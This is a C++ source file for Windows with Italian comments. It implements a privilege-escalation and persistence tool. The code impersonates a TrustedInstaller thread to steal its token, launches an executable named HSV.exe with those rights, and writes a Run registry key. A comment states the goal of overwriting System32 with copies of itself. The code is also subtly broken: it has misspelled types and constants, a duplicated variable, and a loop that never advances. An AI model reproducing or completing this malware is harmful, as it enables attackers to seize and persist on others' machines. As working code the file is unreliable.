#include <iostream>
#include <windows.h>
#include <sys/stat.h>
#include <tlhelp32.h>
using namespace std;

typedef NTSTATUS(NTAPI* pNtImpersonateThread)(
    HANDLE ThreadHandle,                    // Il tuo thread (GetCurrentThread())
    HANDLE ThreadToImpersonate,             // Thread di TrustedInstaller
    PSECURITY_QUALITY_OF_SERVICE SQOS       // Struttura di qualità
);

void en(const char *priv)
{
    HANDLE tok;
    LUID lui;
    TOKEN_PRIVILEGES tp;
    OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY|TOKEN_ALL_ACCESS,&tok);
    LookupPrivilegeValueA(NULL,priv,&lui);
    tp.PrivilegesCount = 1;
    tp.Privileges[0].Luid = lui;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivilege(tok,FALSE,&tp,0,NULL,NULL); 
}

int getru()
{
  int tr;
    SERVICE_STATUS_PROCESS ssp = {0};
    SC_HANDLE os = OpenSCManager(NULL,NULL,SC_MANAGER_CONNECT);
    SC_HANDLE chk = OpenServiceA(os,"TrustedInstaller",SERVICE_QUERY_STATUS|SERVICE_START);
    StartServiceA(chk,NULL,0);
    Sleep(2000);
    DWORD by;
    QueryServiceStatusEx(chk,SC_STATUS_PROCESS_INFO,(LPBYTE)&ssp,sizeof(ssp),&by);
    if(ssp.dwCurrentState == SERVICE_RUNNING)
    {
        tr = ssp.dwProcessId;
    }
    return tr;
}

void latent()
{
    DeleteFileA("C:\\Windows\\Tasks\\MAX");
    ofstream la("C:\\Windows\\Tasks\\LAT");
    la<<"";
    la.close();
    SC_HANDLE jsa = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    SC_HANDLE sa = OpenServiceA(jsa,"HSV",SERVICE_ALL_ACCESS);
    DeleteServiceA(sa);
    HKEY key;
    const char *lath = "C:\\Windows\\Tasks\\hsv.exe";
    RegCreateKeyA(HKEY_CURRENT_USER,L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&key);
    RegSetValueExA(key,"HSV",0,(const BYTE*)lath,strlen(lath)+1);
    RegCloseKey(key);
}

int main(int agrc,char *argv[])
{
    const char *dir = "C:\\Windows\\Tasks\\LAT";
    const char *chk = "C:\\Windows\\Tasks\\MAX";
    struct stat sb;
    if(stat(dir,&sb)== 0)
    {
        /*i have in progarm to rewrite entire System32 with copy
        of myself but it's only a demo after he will finish it's thing
        it will return in a latent state like HSV 
        */
        //latent();
        return 0;
    }
    struct stat sb;
    if(stat(chk,&sb)== 0)
    {

        return 0;
    }
    en(SE_DEBUG_NAME);
    en(SE_IMPERSONATE_NAME);
    int tru = getru();
    HANDLE os = OpenProcess(PROCESS_QUERY_STATUS|PROCESS_CREATE_THREAD,FALSE,tru);
    HANDLE hT;
    Thread32Entry te;
    bool res;
    HANDLE Snap;
    Snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,&te);
    res = Thread32First(Snap,&te);
    while(res)
    {
        if(te.th32OwnerProcessID == tru)
        {
            hT = OpenThread(THREAD_DIRECT_IMPERSOANTION,FALSE,te.th32ThreadID);
            break;
        }
    }
    HMODULE ntdll = GetModuleHandle("ntdll.dll");
    pNtImpersonateThread NtImpersonate = (pNtImpersonateThread)GetProcAddress(ntdll,"NtImpersonateThread");
    SECURITY_QUALITY_OF_SERVICE sqos = {sizeof(sqos),SecurityImpersonation,SECURITY_STATIC_TRACKING,FALSE};
    NtImpersonate(GetCurrentThread(),hT,&sqos);
    HANDLE dup,ori;
    OpenThreadToken(GetCurrentThread(),TOKEN_ALL_ACCESS,&ori);
    DuplicateTokenEx(ori,TOKEN_ALL_ACCESS,SecurityImpersonation,TokenPrimary,&dup);
    ofstream os(chk);
    os<<"";
    os.close();
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    CreateProcessWithTokenW(dup,L"C:\\Windows\\SysWOW64\\HSV.exe",NULL,CREATE_UNICODE_ENVIROMENT,NULL,NULL,&si,&pi);

    return 0;
}